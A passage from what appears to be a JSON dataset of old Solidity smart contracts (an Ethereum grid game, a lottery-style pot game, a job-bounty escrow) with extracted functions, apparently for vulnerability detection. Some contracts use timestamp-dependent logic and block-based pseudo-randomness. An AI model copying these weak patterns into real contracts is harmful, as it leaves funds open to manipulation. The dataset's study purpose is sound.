_address) {\n return rankOnePlayerAddress;\n }\n function getNumberOfBlocksRemainingToWin () public view returns (int256 _numberOfBlocks) {\n return int256(BLOCKS_TO_CONFIRM_TO_WIN_THE_GAME) - int256(block.number.sub(isFirstSinceBlock));\n }\n function scoreOf (address _address) public view returns (uint256 _score) {\n return players[_address].score;\n }\n function ownerOf (uint256 _cellId) public view returns (address _owner) {\n return cells[_cellId].owner;\n }\n function isGameFinished() public view returns (bool _isGameFinished) {\n return rankOnePlayerAddress != address(0) && getNumberOfBlocksRemainingToWin() < 0;\n }\n function calculateScoresIfCellIsBought (address _newOwner, address _oldOwner, uint256 _cellId) internal view returns (uint256 _newOwnerScore, uint256 _oldOwnerScore) {\n uint256 oldOwnerScoreAdjustment = DEFAULT_POINTS_PER_CELL;\n uint256 newOwnerScoreAdjustment = DEFAULT_POINTS_PER_CELL;\n oldOwnerScoreAdjustment = oldOwnerScoreAdjustment.add(calculateNumberOfNeighbours(_cellId, _oldOwner).mul(POINTS_PER_NEIGHBOUR).mul(2));\n newOwnerScoreAdjustment = newOwnerScoreAdjustment.add(calculateNumberOfNeighbours(_cellId, _newOwner).mul(POINTS_PER_NEIGHBOUR).mul(2));\n if (_oldOwner == address(0)) {\n oldOwnerScoreAdjustment = 0;\n }\n return (scoreOf(_newOwner).add(newOwnerScoreAdjustment), scoreOf(_oldOwner).sub(oldOwnerScoreAdjustment));\n }\n function calculateNumberOfNeighbours(uint256 _cellId, address _address) internal view returns (uint256 _numberOfNeighbours) {\n uint256 numberOfNeighbours;\n (uint256 top, uint256 bottom, uint256 left, uint256 right) = getNeighbourhoodOf(_cellId);\n if (top != NUMBER_OF_CELLS && ownerOf(top) == _address) {\n numberOfNeighbours = numberOfNeighbours.add(1);\n }\n if (bottom != NUMBER_OF_CELLS && ownerOf(bottom) == _address) {\n numberOfNeighbours = numberOfNeighbours.add(1);\n }\n if (left != NUMBER_OF_CELLS && ownerOf(left) == _address) {\n numberOfNeighbours = numberOfNeighbours.add(1);\n }\n if (right != NUMBER_OF_CELLS && ownerOf(right) == _address) {\n numberOfNeighbours = numberOfNeighbours.add(1);\n }\n return numberOfNeighbours;\n }\n function getNeighbourhoodOf(uint256 _cellId) internal pure returns (uint256 _top, uint256 _bottom, uint256 _left, uint256 _right) {\n uint256 topCellId = NUMBER_OF_CELLS;\n if(_cellId >= NUMBER_OF_LINES){\n topCellId = _cellId.sub(NUMBER_OF_LINES);\n }\n uint256 bottomCellId = _cellId.add(NUMBER_OF_LINES);\n if (bottomCellId >= NUMBER_OF_CELLS) {\n bottomCellId = NUMBER_OF_CELLS;\n }\n uint256 leftCellId = NUMBER_OF_CELLS;\n if ((_cellId % NUMBER_OF_LINES) != 0) {\n leftCellId = _cellId.sub(1);\n }\n uint256 rightCellId = _cellId.add(1);\n if ((rightCellId % NUMBER_OF_LINES) == 0) {\n rightCellId = NUMBER_OF_CELLS;\n }\n return (topCellId, bottomCellId, leftCellId, rightCellId);\n }\n function _transfer(address _from, address _to, uint256 _cellId) internal {\n require(_cellId < NUMBER_OF_CELLS);\n require(ownerOf(_cellId) == _from);\n require(_to != address(0));\n require(_to != address(this));\n cells[_cellId].owner = _to;\n }\n function withdrawPot(string _message) public {\n require(!isContract(msg.sender));\n require(msg.sender != owner);\n require(rankOnePlayerAddress == msg.sender);\n require(isGameFinished());\n uint256 toWithdraw = potCut;\n potCut = 0;\n msg.sender.transfer(toWithdraw);\n TheEthGameTrophy trophy = TheEthGameTrophy(trophyAddress);\n trophy.award(msg.sender, _message);\n }\n function withdrawDevelopersCut () onlyOwner() public {\n uint256 toWithdraw = developersCut;\n developersCut = 0;\n owner.transfer(toWithdraw);\n }\n function withdrawEarnings () public {\n distributeEarningsBasedOnScore(msg.sender, address(0));\n distributeEarningsBasedOnNumberOfCells(msg.sender);\n uint256 toWithdraw = earningsOfPlayer();\n players[msg.sender].earnings = 0;\n msg.sender.transfer(toWithdraw);\n }\n function setName(bytes32 _name) public {\n if (nameToAddress[_name] != address(0)) {\n return;\n }\n players[msg.sender].name = _name;\n nameToAddress[_name] = msg.sender;\n }\n function nameOf(address _address) external view returns(bytes32 _name) {\n return players[_address].name;\n }\n function addressOf(bytes32 _name) external view returns (address _address) {\n return nameToAddress[_name];\n }\n function isContract(address addr) internal view returns (bool) {\n uint size;\n assembly { size := extcodesize(addr) }\n return size > 0;\n }\n}\ncontract TheEthGameTrophy {\n string public name;\n string public description;\n string public message;\n address public creator;\n address public owner;\n address public winner;\n uint public rank;\n bool private isAwarded = false;\n event Award(uint256 indexed _blockNumber, uint256 indexed _timestamp, address indexed _owner);\n event Transfer (address indexed _from, address indexed _to);\n constructor () public {\n name = \"The Eth Game Winner\";\n description = \"2019-08-17\";\n rank = 1;\n creator = msg.sender;\n }\n function name() constant public returns (string _name) {\n return name;\n }\n function description() constant public returns (string _description) {\n return description;\n }\n function message() constant public returns (string _message) {\n return message;\n }\n function creator() constant public returns (address _creator) {\n return creator;\n }\n function owner() constant public returns (address _owner) {\n return owner;\n }\n function winner() constant public returns (address _winner) {\n return winner;\n }\n function rank() constant public returns (uint _rank) {\n return rank;\n }\n function award(address _address, string _message) public {\n require(msg.sender == creator && !isAwarded);\n isAwarded = true;\n owner = _address;\n winner = _address;\n message = _message;\n emit Award(block.number, block.timestamp, _address);\n }\n function transfer(address _to) private returns (bool success) {\n require(msg.sender == owner);\n owner = _to;\n emit Transfer(msg.sender, _to);\n return true;\n }\n}",
  "extract_feature": [
    "function buy (uint256 _cellId, address _referreal) payable public {\nrequire(msg.value >= priceOf(_cellId));\nrequire(!isContract(msg.sender));\nrequire(_cellId < NUMBER_OF_CELLS);\nrequire(msg.sender != address(0));\nrequire(!isGameFinished());\nrequire(ownerOf(_cellId) != msg.sender);\nrequire(msg.sender != _referreal);\naddress oldOwner = ownerOf(_cellId);\naddress newOwner = msg.sender;\nuint256 price = priceOf(_cellId);\nuint256 excess = msg.value.sub(price);\nbool isReferrealDistributed = distributeToReferreal(price, _referreal);\nif (numberOfCellsBought > 0) {\nharmonicSum = harmonicSum.add(price.mul(NUMBER_OF_CELLS_PERCENTAGE) / (numberOfCellsBought * 100));\nif (isReferrealDistributed) {\ntotalScoreSum = totalScoreSum.add(price.mul(SCORE_PERCENTAGE) / (totalScore * 100));\n} else {\ntotalScoreSum = totalScoreSum.add(price.mul(SCORE_PERCENTAGE.add(REFERREAL_PERCENTAGE)) / (totalScore * 100));\n}\n}else{\npotCut = potCut.add(price.mul(NUMBER_OF_CELLS_PERCENTAGE.add(SCORE_PERCENTAGE)) / 100);\n}\nnumberOfCellsBought++;\ndistributeEarningsBasedOnNumberOfCells(newOwner);\nplayers[newOwner].numberOfCellsBought++;\nplayers[newOwner].numberOfCellsOwned++;\nif (ownerOf(_cellId) != address(0)) {\nplayers[oldOwner].numberOfCellsOwned--;\n}\nplayers[newOwner].lastCellBoughtOnBlockNumber = block.number;\naddress oldRankOnePlayer = rankOnePlayerAddress;\n(uint256 newOwnerScore, uint256 oldOwnerScore) = calculateScoresIfCellIsBought(newOwner, oldOwner, _cellId);\ndistributeEarningsBasedOnScore(newOwner, oldOwner);\ntotalScore = totalScore.sub(scoreOf(newOwner).add(scoreOf(oldOwner)));\nplayers[newOwner].score = newOwnerScore;\nplayers[oldOwner].score = oldOwnerScore;\ntotalScore = totalScore.add(scoreOf(newOwner).add(scoreOf(oldOwner)));\ncells[_cellId].price = nextPriceOf(_cellId);\nif (players[newOwner].numberOfCellsOwned == 1) {\nranking.push(newOwner);\n}\nif (oldOwner == rankOnePlayerAddress || (players[oldOwner].numberOfCellsOwned == 0 && oldOwner != address(0))) {\n(address rankOnePlayer, uint256 oldOwnerIndex) = getRankOnePlayer(oldOwner);\nif (players[oldOwner].numberOfCellsOwned == 0 && oldOwner != address(0)) {\ndelete ranking[oldOwnerIndex];\n}\nrankOnePlayerAddress = rankOnePlayer;\n}else{\nif (scoreOf(newOwner) >= scoreOf(rankOnePlayerAddress)) {\nrankOnePlayerAddress = newOwner;\n}\n}\nif (rankOnePlayerAddress != oldRankOnePlayer) {\nisFirstSinceBlock = block.number;\n}\ndevelopersCut = developersCut.add(price.mul(DEVELOPER_PERCENTAGE) / 100);\npotCut = potCut.add(price.mul(POT_PERCENTAGE) / 100);\n_transfer(oldOwner, newOwner, _cellId);\nemit Bought(oldOwner, newOwner);\nif (excess > 0) {\nnewOwner.transfer(excess);\n}\n}",
    "function getNumberOfBlocksRemainingToWin () public view returns (int256 _numberOfBlocks) {\nreturn int256(BLOCKS_TO_CONFIRM_TO_WIN_THE_GAME) - int256(block.number.sub(isFirstSinceBlock));\n}",
    "function award(address _address, string _message) public {\nrequire(msg.sender == creator && !isAwarded);\nisAwarded = true;\nowner = _address;\nwinner = _address;\nmessage = _message;\nemit Award(block.number, block.timestamp, _address);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ee2"
  },
  "filename": "1704.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n return a / b;\n }\n function mod(uint a, uint b) internal pure returns (uint) {\n return a % b;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Dividends {\n using SafeMath for *;\n uint private constant FIXED_POINT = 1000000000000000000;\n struct Scheme {\n uint value;\n uint shares;\n uint mask;\n }\n struct Vault {\n uint value;\n uint shares;\n uint mask;\n }\n mapping (uint => mapping (address => Vault)) private vaultOfAddress;\n mapping (uint => Scheme) private schemeOfId;\n function buyShares (uint _schemeId, address _owner, uint _shares, uint _value) internal {\n require(_owner != address(0));\n require(_shares > 0 && _value > 0);\n uint value = _value.mul(FIXED_POINT);\n Scheme storage scheme = schemeOfId[_schemeId];\n scheme.value = scheme.value.add(_value);\n scheme.shares = scheme.shares.add(_shares);\n require(value > scheme.shares);\n uint pps = value.div(scheme.shares);\n Vault storage vault = vaultOfAddress[_schemeId][_owner];\n vault.shares = vault.shares.add(_shares);\n vault.mask = vault.mask.add(scheme.mask.mul(_shares));\n vault.value = vault.value.add(value.sub(pps.mul(scheme.shares)));\n scheme.mask = scheme.mask.add(pps);\n }\n function flushVault (uint _schemeId, address _owner) internal {\n uint gains = gainsOfVault(_schemeId, _owner);\n if (gains > 0) {\n Vault storage vault = vaultOfAddress[_schemeId][_owner];\n vault.value = vault.value.add(gains);\n vault.mask = vault.mask.add(gains);\n }\n }\n function withdrawVault (uint _schemeId, address _owner) internal returns (uint) {\n flushVault(_schemeId, _owner);\n Vault storage vault = vaultOfAddress[_schemeId][_owner];\n uint payout = vault.value.div(FIXED_POINT);\n if (payout > 0) {\n vault.value = 0;\n }\n return payout;\n }\n function creditVault (uint _schemeId, address _owner, uint _value) internal {\n Vault storage vault = vaultOfAddress[_schemeId][_owner];\n vault.value = vault.value.add(_value.mul(FIXED_POINT));\n }\n function gainsOfVault (uint _schemeId, address _owner) internal view returns (uint) {\n Scheme storage scheme = schemeOfId[_schemeId];\n Vault storage vault = vaultOfAddress[_schemeId][_owner];\n if (vault.shares == 0) {\n return 0;\n }\n return scheme.mask.mul(vault.shares).sub(vault.mask);\n }\n function valueOfVault (uint _schemeId, address _owner) internal view returns (uint) {\n Vault storage vault = vaultOfAddress[_schemeId][_owner];\n return vault.value;\n }\n function balanceOfVault (uint _schemeId, address _owner) internal view returns (uint) {\n Vault storage vault = vaultOfAddress[_schemeId][_owner];\n uint total = vault.value.add(gainsOfVault(_schemeId, _owner));\n uint balance = total.div(FIXED_POINT);\n return balance;\n }\n function sharesOfVault (uint _schemeId, address _owner) internal view returns (uint) {\n Vault storage vault = vaultOfAddress[_schemeId][_owner];\n return vault.shares;\n }\n function valueOfScheme (uint _schemeId) internal view returns (uint) {\n return schemeOfId[_schemeId].value;\n }\n function sharesOfScheme (uint _schemeId) internal view returns (uint) {\n return schemeOfId[_schemeId].shares;\n }\n}\nlibrary Utils {\n using SafeMath for uint;\n uint private constant LAST_COUNTRY = 195;\n function regularTicketPrice () internal pure returns (uint) {\n return 100000000000000;\n }\n function goldenTicketPrice (uint _x) internal pure returns (uint) {\n uint price = _x.mul(_x).div(2168819140000000000000000).add(100000000000000).add(_x.div(100000));\n return price < regularTicketPrice() ? regularTicketPrice() : price;\n }\n function ticketsForWithExcess (uint _value) internal pure returns (uint, uint) {\n uint tickets = _value.div(regularTicketPrice());\n uint excess = _value.sub(tickets.mul(regularTicketPrice()));\n return (tickets, excess);\n }\n function percentageOf (uint _value, uint _p) internal pure returns (uint) {\n return _value.mul(_p).div(100);\n }\n function validReferralCode (string _code) internal pure returns (bool) {\n bytes memory b = bytes(_code);\n if (b.length < 3) {\n return false;\n }\n for (uint i = 0; i < b.length; i++) {\n bytes1 c = b[i];\n if (\n !(c >= 0x30 && c <= 0x39) &&\n !(c >= 0x41 && c <= 0x5A) &&\n !(c >= 0x61 && c <= 0x7A) &&\n !(c == 0x2D)\n ) {\n return false;\n }\n }\n return true;\n }\n function validNick (string _nick) internal pure returns (bool) {\n return bytes(_nick).length > 3;\n }\n function validCountryId (uint _countryId) internal pure returns (bool) {\n return _countryId > 0 && _countryId <= LAST_COUNTRY;\n }\n}\ncontract Events {\n event Started (\n uint _time\n );\n event Bought (\n address indexed _player,\n address indexed _referral,\n uint _countryId,\n uint _tickets,\n uint _value,\n uint _excess\n );\n event Promoted (\n address indexed _player,\n uint _goldenTickets,\n uint _endTime\n );\n event Withdrew (\n address indexed _player,\n uint _amount\n );\n event Registered (\n string _code, address indexed _referral\n );\n event Won (\n address indexed _winner, uint _pot\n );\n}\ncontract Constants {\n uint internal constant MAIN_SCHEME = 1337;\n uint internal constant DEFAULT_COUNTRY = 1;\n uint internal constant SET_NICK_FEE = 0.01 ether;\n uint internal constant REFERRAL_REGISTRATION_FEE = 0.01 ether;\n uint internal constant TO_DIVIDENDS = 42;\n uint internal constant TO_REFERRAL = 10;\n uint internal constant TO_DEVELOPERS = 4;\n uint internal constant TO_COUNTRY = 12;\n}\ncontract State is Constants {\n address internal addressOfOwner;\n uint internal maxTime = 0;\n uint internal addedTime = 0;\n uint internal totalPot = 0;\n uint internal startTime = 0;\n uint internal endTime = 0;\n bool internal potWithdrawn = false;\n address internal addressOfCaptain;\n struct Info {\n address referral;\n uint countryId;\n uint withdrawn;\n string nick;\n }\n mapping (address => Info) internal infoOfAddress;\n mapping (address => string[]) internal codesOfAddress;\n mapping (string => address) internal addressOfCode;\n modifier restricted () {\n require(msg.sender == addressOfOwner);\n _;\n }\n modifier active () {\n require(startTime > 0);\n require(block.timestamp < endTime);\n require(!potWithdrawn);\n _;\n }\n modifier player () {\n require(infoOfAddress[msg.sender].countryId > 0);\n _;\n }\n}\ncontract Core is Events, State, Dividends {}\ncontract ExternalView is Core {\n function totalInfo () external view returns (bool, bool, address, uint, uint, uint, uint, uint, uint, address) {\n return (\n startTime > 0,\n block.timestamp >= endTime,\n addressOfCaptain,\n totalPot,\n endTime,\n sharesOfScheme(MAIN_SCHEME),\n valueOfScheme(MAIN_SCHEME),\n maxTime,\n addedTime,\n addressOfOwner\n );\n }\n function countryInfo (uint _countryId) external view returns (uint, uint) {\n return (\n sharesOfScheme(_countryId),\n valueOfScheme(_countryId)\n );\n }\n function playerInfo (address _player) external view returns (uint, uint, uint, address, uint, uint, string) {\n Info storage info = infoOfAddress[_player];\n return (\n sharesOfVault(MAIN_SCHEME, _player),\n balanceOfVault(MAIN_SCHEME, _player),\n balanceOfVault(info.countryId, _player),\n info.referral,\n info.countryId,\n info.withdrawn,\n info.nick\n );\n }\n function numberOfReferralCodes (address _player) external view returns (uint) {\n return codesOfAddress[_player].length;\n }\n function referralCodeAt (address _player, uint i) external view returns (string) {\n return codesOfAddress[_player][i];\n }\n function codeToAddress (string _code) external view returns (address) {\n return addressOfCode[_code];\n }\n function goldenTicketPrice (uint _x) external pure returns (uint) {\n return Utils.goldenTicketPrice(_x);\n }\n}\ncontract Internal is Core {\n function _registerReferral (string _code, address _referral) internal {\n require(Utils.validReferralCode(_code));\n require(addressOfCode[_code] == address(0));\n addressOfCode[_code] = _referral;\n codesOfAddress[_referral].push(_code);\n emit Registered(_code, _referral);\n }\n}\ncontract WinnerWinner is Core, Internal, ExternalView {\n using SafeMath for *;\n constructor () public {\n addressOfOwner = msg.sender;\n }\n function () public payable {\n buy(addressOfOwner, DEFAULT_COUNTRY);\n }\n function start (uint _maxTime, uint _addedTime) public restricted {\n require(startTime == 0);\n require(_maxTime > 0 && _addedTime > 0);\n require(_maxTime > _addedTime);\n maxTime = _maxTime;\n addedTime = _addedTime;\n startTime = block.timestamp;\n endTime = startTime + maxTime;\n addressOfCaptain = addressOfOwner;\n _registerReferral(\"owner\", addressOfOwner);\n emit Started(startTime);\n }\n function buy (address _referral, uint _countryId) public payable active {\n require(msg.value >= Utils.regularTicketPrice());\n require(msg.value <= 100000 ether);\n require(codesOfAddress[_referral].length > 0);\n require(_countryId != MAIN_SCHEME);\n require(Utils.validCountryId(_countryId));\n (uint tickets, uint excess) = Utils.ticketsForWithExcess(msg.value);\n uint value = msg.value.sub(excess);\n require(tickets > 0);\n require(value.add(excess) == msg.value);\n Info storage info = infoOfAddress[msg.sender];\n if (info.countryId == 0) {\n info.referral = _referral;\n info.countryId = _countryId;\n }\n uint vdivs = Utils.percentageOf(value, TO_DIVIDENDS);\n uint vreferral = Utils.percentageOf(value, TO_REFERRAL);\n uint vdevs = Utils.percentageOf(value, TO_DEVELOPERS);\n uint vcountry = Utils.percentageOf(value, TO_COUNTRY);\n uint vpot = value.sub(vdivs).sub(vreferral).sub(vdevs).sub(vcountry);\n assert(vdivs.add(vreferral).add(vdevs).add(vcountry).add(vpot) == value);\n buyShares(MAIN_SCHEME, msg.sender, tickets, vdivs);\n buyShares(info.countryId, msg.sender, tickets, vcountry);\n creditVault(MAIN_SCHEME, info.referral, vreferral);\n creditVault(MAIN_SCHEME, addressOfOwner, vdevs);\n if (excess > 0) {\n creditVault(MAIN_SCHEME, msg.sender, excess);\n }\n uint goldenTickets = value.div(Utils.goldenTicketPrice(totalPot));\n if (goldenTickets > 0) {\n endTime = endTime.add(goldenTickets.mul(addedTime)) > block.timestamp.add(maxTime) ?\n block.timestamp.add(maxTime) : endTime.add(goldenTickets.mul(addedTime));\n addressOfCaptain = msg.sender;\n emit Promoted(addressOfCaptain, goldenTickets, endTime);\n }\n totalPot = totalPot.add(vpot);\n emit Bought(msg.sender, info.referral, info.countryId, tickets, value, excess);\n }\n function setNick (string _nick) public payable {\n require(msg.value == SET_NICK_FEE);\n require(Utils.validNick(_nick));\n infoOfAddress[msg.sender].nick = _nick;\n creditVault(MAIN_SCHEME, addressOfOwner, msg.value);\n }\n function registerCode (string _code) public payable {\n require(startTime > 0);\n require(msg.value == REFERRAL_REGISTRATION_FEE);\n _registerReferral(_code, msg.sender);\n creditVault(MAIN_SCHEME, addressOfOwner, msg.value);\n }\n function giftCode (string _code, address _referral) public restricted {\n _registerReferral(_code, _referral);\n }\n function withdraw () public {\n Info storage info = infoOfAddress[msg.sender];\n uint payout = withdrawVault(MAIN_SCHEME, msg.sender);\n if (Utils.validCountryId(info.countryId)) {\n payout = payout.add(withdrawVault(info.countryId, msg.sender));\n }\n if (payout > 0) {\n info.withdrawn = info.withdrawn.add(payout);\n msg.sender.transfer(payout);\n emit Withdrew(msg.sender, payout);\n }\n }\n function withdrawPot () public player {\n require(startTime > 0);\n require(block.timestamp > (endTime + 10 minutes));\n require(!potWithdrawn);\n require(totalPot > 0);\n require(addressOfCaptain == msg.sender);\n uint payout = totalPot;\n totalPot = 0;\n potWithdrawn = true;\n addressOfCaptain.transfer(payout);\n emit Won(msg.sender, payout);\n }\n}",
  "extract_feature": [
    "function totalInfo () external view returns (bool, bool, address, uint, uint, uint, uint, uint, uint, address) {\nreturn (\nstartTime > 0,\nblock.timestamp >= endTime,\naddressOfCaptain,\ntotalPot,\nendTime,\nsharesOfScheme(MAIN_SCHEME),\nvalueOfScheme(MAIN_SCHEME),\nmaxTime,\naddedTime,\naddressOfOwner\n);\n}",
    "function start (uint _maxTime, uint _addedTime) public restricted {\nrequire(startTime == 0);\nrequire(_maxTime > 0 && _addedTime > 0);\nrequire(_maxTime > _addedTime);\nmaxTime = _maxTime;\naddedTime = _addedTime;\nstartTime = block.timestamp;\nendTime = startTime + maxTime;\naddressOfCaptain = addressOfOwner;\n_registerReferral(\"owner\", addressOfOwner);\nemit Started(startTime);\n}",
    "function buy (address _referral, uint _countryId) public payable active {\nrequire(msg.value >= Utils.regularTicketPrice());\nrequire(msg.value <= 100000 ether);\nrequire(codesOfAddress[_referral].length > 0);\nrequire(_countryId != MAIN_SCHEME);\nrequire(Utils.validCountryId(_countryId));\n(uint tickets, uint excess) = Utils.ticketsForWithExcess(msg.value);\nuint value = msg.value.sub(excess);\nrequire(tickets > 0);\nrequire(value.add(excess) == msg.value);\nInfo storage info = infoOfAddress[msg.sender];\nif (info.countryId == 0) {\ninfo.referral = _referral;\ninfo.countryId = _countryId;\n}\nuint vdivs = Utils.percentageOf(value, TO_DIVIDENDS);\nuint vreferral = Utils.percentageOf(value, TO_REFERRAL);\nuint vdevs = Utils.percentageOf(value, TO_DEVELOPERS);\nuint vcountry = Utils.percentageOf(value, TO_COUNTRY);\nuint vpot = value.sub(vdivs).sub(vreferral).sub(vdevs).sub(vcountry);\nassert(vdivs.add(vreferral).add(vdevs).add(vcountry).add(vpot) == value);\nbuyShares(MAIN_SCHEME, msg.sender, tickets, vdivs);\nbuyShares(info.countryId, msg.sender, tickets, vcountry);\ncreditVault(MAIN_SCHEME, info.referral, vreferral);\ncreditVault(MAIN_SCHEME, addressOfOwner, vdevs);\nif (excess > 0) {\ncreditVault(MAIN_SCHEME, msg.sender, excess);\n}\nuint goldenTickets = value.div(Utils.goldenTicketPrice(totalPot));\nif (goldenTickets > 0) {\nendTime = endTime.add(goldenTickets.mul(addedTime)) > block.timestamp.add(maxTime) ?\nblock.timestamp.add(maxTime) : endTime.add(goldenTickets.mul(addedTime));\naddressOfCaptain = msg.sender;\nemit Promoted(addressOfCaptain, goldenTickets, endTime);\n}\ntotalPot = totalPot.add(vpot);\nemit Bought(msg.sender, info.referral, info.countryId, tickets, value, excess);\n}",
    "function withdrawPot () public player {\nrequire(startTime > 0);\nrequire(block.timestamp > (endTime + 10 minutes));\nrequire(!potWithdrawn);\nrequire(totalPot > 0);\nrequire(addressOfCaptain == msg.sender);\nuint payout = totalPot;\ntotalPot = 0;\npotWithdrawn = true;\naddressOfCaptain.transfer(payout);\nemit Won(msg.sender, payout);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ee3"
  },
  "filename": "1826.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ReentrancyGuard {\n bool private reentrancyLock = false;\n modifier nonReentrant() {\n require(!reentrancyLock);\n reentrancyLock = true;\n _;\n reentrancyLock = false;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ninterface ERC20 {\n function totalSupply() external view returns (uint supply);\n function balanceOf(address _owner) external view returns (uint balance);\n function transfer(address _to, uint _value) external returns (bool success);\n function transferFrom(address _from, address _to, uint _value) external returns (bool success);\n function approve(address _spender, uint _value) external returns (bool success);\n function allowance(address _owner, address _spender) external view returns (uint remaining);\n function decimals() external view returns(uint digits);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\ncontract JobsBounty is Ownable, ReentrancyGuard {\n using SafeMath for uint256;\n string public companyName;\n string public jobPost;\n uint public endDate;\n address public INDToken = 0xf8e386eda857484f5a12e4b5daa9984e06e73705;\n constructor(string _companyName,\n string _jobPost,\n uint _endDate\n ) public{\n companyName = _companyName;\n jobPost = _jobPost ;\n endDate = _endDate;\n }\n function ownBalance() public view returns(uint256) {\n return ERC20(INDToken).balanceOf(this);\n }\n function payOutBounty(address _referrerAddress, address _candidateAddress) public onlyOwner nonReentrant returns(bool){\n uint256 individualAmounts = (ERC20(INDToken).balanceOf(this) / 100) * 50;\n assert(block.timestamp >= endDate);\n assert(ERC20(INDToken).transfer(_candidateAddress, individualAmounts));\n assert(ERC20(INDToken).transfer(_referrerAddress, individualAmounts));\n return true;\n }\n function withdrawERC20Token(address anyToken) public onlyOwner nonReentrant returns(bool){\n assert(block.timestamp >= endDate);\n assert(ERC20(anyToken).transfer(owner, ERC20(anyToken).balanceOf(this)));\n return true;\n }\n function withdrawEther() public nonReentrant returns(bool){\n if(address(this).balance > 0){\n owner.transfer(address(this).balance);\n }\n return true;\n }\n}",
  "extract_feature": [
    "function payOutBounty(address _referrerAddress, address _candidateAddress) public onlyOwner nonReentrant returns(bool){\nuint256 individualAmounts = (ERC20(INDToken).balanceOf(this) / 100) * 50;\nassert(block.timestamp >= endDate);\nassert(ERC20(INDToken).transfer(_candidateAddress, individualAmounts));\nassert(ERC20(INDToken).transfer(_referrerAddress, individualAmounts));\nreturn true;\n}",
    "function withdrawERC20Token(address anyToken) public onlyOwner nonReentrant returns(bool){\nassert(block.timestamp >= endDate);\nassert(ERC20(anyToken).transfer(owner, ERC20(anyToken).balanceOf(this)));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ee4"
  },
  "filename": "237.sol",
  "content": "pragma solidity ^0.4.24;\ninterface tokenRecipient {\n function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external;\n}\ncontract braggerContract {\n mapping (address => uint256) public balanceOf;\n mapping (address => mapping (address => uint256)) public allowance;\n mapping (address => bool) private isUser;\n mapping (address => bool) private hasPicture;\n mapping (address => string) private userWalletToUserName;\n mapping (string => address) private userNameToUserWallet;\n mapping (string => string) private userNameToPicture;\n mapping (address => string) private userWalletToPicture;\n mapping (address => uint256) private fineLevel;\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Burn(address indexed from, uint256 value);\n address public ownerAddress = 0x000;\n address private bragAddress = 0x845EC9f9C0650b98f70E05fc259F4A04f6AC366e;\n string private initialQuote = \"Teach your people with your wisdom.\";\n string private initialPicture = \"https:\n uint256 basicFine = 25000000000000000;\n uint256 blocks;\n uint256 totalBraggedValue = 0;\n uint256 winningpot = 0;\n uint256 totalbrags = 0;\n struct Bragger{\n address braggerAddress;\n uint256 braggedAmount;\n string braggerQuote;\n }\n Bragger[] private braggers;\n struct User{\n address userAddress;\n string userName;\n }\n User[] private users;\n modifier onlyCreator() {\n require(msg.sender == ownerAddress);\n _;\n }\n constructor() public {\n blocks=0;\n ownerAddress = msg.sender;\n }\n function random() private view returns (uint8) {\n return uint8(uint256(keccak256(block.timestamp, block.difficulty))%251);\n }\n function random2() private view returns (uint8) {\n return uint8(uint256(keccak256(blocks, block.difficulty))%251);\n }\n function random3() private view returns (uint8) {\n return uint8(uint256(keccak256(blocks, block.difficulty))%braggers.length);\n }\n function getTotalBraggedVolume() public view returns (uint256 _amount){\n return totalBraggedValue;\n }\n function getCurrentBragKing() public view returns(address _bragger, uint256 _amount, string _quote, string _username, string _picture){\n _bragger = braggers[braggers.length-1].braggerAddress;\n _amount = braggers[braggers.length-1].braggedAmount;\n _quote = braggers[braggers.length-1].braggerQuote;\n if(isAlreadyUser(_bragger)){\n _username = getUserNameByWallet(_bragger);\n } else {\n _username = \"\";\n }\n if(hasPicture[_bragger]){\n _picture = userWalletToPicture[_bragger];\n } else {\n _picture = initialPicture;\n }\n return (_bragger, _amount, _quote, _username, _picture);\n }\n function arrayLength()public view returns(uint256 length){\n length = braggers.length;\n return length;\n }\n function getBraggerAtIndex(uint256 _index) public view returns(address _bragger, uint256 _brag, string _username, string _picture){\n _bragger = braggers[_index].braggerAddress;\n _brag = braggers[_index].braggedAmount;\n if(isAlreadyUser(_bragger)){\n _username = getUserNameByWallet(_bragger);\n } else {\n _username = \"\";\n }\n if(hasPicture[_bragger]){\n _picture = userWalletToPicture[_bragger];\n } else {\n _picture = initialPicture;\n }\n return (_bragger, _brag, _username, _picture);\n }\n function getUserNameByWallet(address _wallet) public view returns (string _username){\n require(isAlreadyUser(_wallet));\n _username = userWalletToUserName[_wallet];\n return _username;\n }\n function getUserPictureByWallet(address _wallet) public view returns (string _url){\n require(isAlreadyUser(_wallet));\n _url = userWalletToPicture[_wallet];\n return _url;\n }\n function getUserWalletByUsername(string _username) public view returns(address _address){\n address _user = userNameToUserWallet[_username];\n return (_user);\n }\n function getUserPictureByUsername(string _username) public view returns(string _url){\n _url = userNameToPicture[_username];\n return (_url);\n }\n function 